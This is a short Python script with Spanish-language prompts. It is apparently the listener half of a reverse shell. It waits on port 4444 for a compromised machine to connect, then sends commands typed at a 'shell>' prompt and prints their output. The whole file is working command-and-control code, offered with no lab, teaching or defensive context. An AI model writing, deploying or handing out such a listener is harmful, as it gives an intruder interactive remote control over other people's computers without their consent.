import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 4444))
    server_socket.listen(1)
    
    print("Esperando conexiones en puerto 4444...")
    client_socket, address = server_socket.accept()
    print(f"Conexión recibida de {address}")
    
    while True:
        command = input("shell> ")
        client_socket.send(command.encode())
        data = client_socket.recv(1024).decode()
        print(data)

if __name__ == "__main__":
    start_server()
